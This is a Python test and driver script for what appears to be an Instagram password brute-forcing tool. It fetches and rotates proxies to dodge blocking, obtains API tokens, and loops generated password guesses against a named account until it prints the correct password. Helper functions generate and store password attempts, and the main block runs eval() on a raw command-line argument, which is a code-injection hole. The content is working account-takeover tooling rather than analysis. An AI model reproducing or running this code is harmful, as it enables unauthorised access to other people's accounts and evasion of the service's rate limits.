from __future__ import absolute_import

from argparse import ArgumentParser
import os

from app import settings
from app.exceptions import (ApiBadProxyException, ApiClientException,
    ApiTimeoutException, ApiMaxRetryError, ApiException, ApiSSLException)
from app.lib.users import User, Users
from app.lib.api import ProxyApi, InstagramApi


def test_get_proxies():

    proxy_api = ProxyApi(settings.PROXY_LINKS[0])
    proxies = proxy_api.get_proxies()
    for proxy in proxies:
        print(proxy)


def test_get_extra_proxies():
    proxy_api = ProxyApi(settings.PROXY_LINKS[0])
    proxies = proxy_api.get_extra_proxies()
    print(list(proxies))


def get_api_token_with_proxy(user, proxy):
    api = InstagramApi(user.username, proxy=proxy)
    return api.fetch_token()


def get_api_token(user):

    proxy_api = ProxyApi(settings.PROXY_LINKS[0])
    proxies = list(proxy_api.get_proxies())

    for proxy in proxies:
        api = InstagramApi(user.username, proxy=proxy)
        try:
            token = api.fetch_token()
        except ApiBadProxyException as e:
            print(f"{e.__class__.__name__} error getting token... updating proxy.")
            continue
        except ApiClientException as e:
            if e.error_type == 'generic_request_error':
                print(f"{e.__class__.__name__} error getting token... updating proxy.")
                continue
            else:
                raise e
        else:
            print(f"Got Token in Test {token}")
            print(f"Got Proxy in Test {proxy}")
            return token, proxy


def try_login(api, password, proxies, token):
    valid_response = False
    proxy_count = 0

    while not valid_response:
        print(f"Trying to login with {password}")
        proxy = proxies[proxy_count]
        api.update_proxy(proxy)

        try:
            results = api.login(password, token=token)
        except ApiBadProxyException as e:
            print(f"{e.__class__.__name__}... updating proxy.")
            proxy_count += 1
        except ApiClientException as e:
            if e.error_type == 'generic_request_error':
                print(f"{e.__class__.__name__}... updating proxy.")
                proxy_count += 1
            else:
                raise e
        else:
            valid_response = True

    return results, proxy


def test_login():

    proxy_api = ProxyApi(settings.PROXY_LINKS[0])
    proxies = list(proxy_api.get_proxies())

    user = User('nickmflorin')
    passwords = user.get_raw_passwords()

    token, proxy = get_api_token(user)
    if not token:
        raise Exception("Token not retrieved")

    api = InstagramApi(user.username, token=token, proxy=proxy)

    for password in passwords:
        result, proxy = try_login(api, password, proxies, token)
        print(result)
        if result.accessed:
            print(f"Correct Password: {password}")
            break

        index = proxies.index(proxy)
        proxies = proxies[index:]


def test_generate_passwords():
    user = User("nickmflorin")
    for pw in user.get_new_attempts():
        print(pw)


def test_create_user():
    username = "testuser"
    Users.create(username)


def test_get_passwords():
    username = "testuser"
    user = User(username)
    passwords = user.get_raw_passwords()
    print(passwords)


def test_get_attempts():
    username = "testuser"
    user = User(username)
    attempts = user.get_password_attempts()
    print(attempts)


def test_update_attempts():
    username = "testuser"
    attempts = ['first', 'second', 'third', 'fourth', 'fifth']
    user = User(username)
    user.update_password_attempts(attempts)


def get_args():
    args = ArgumentParser()
    args.add_argument('method', help='Test method to run.')
    return args.parse_args()


if __name__ == '__main__':

    abspath = os.path.abspath(__file__)
    dname = os.path.dirname(abspath)
    os.chdir(dname)

    arugments = get_args()

    # Probably not the best way to do this, but we'll worry about that later.
    method = eval(arugments.method)
    method.__call__()
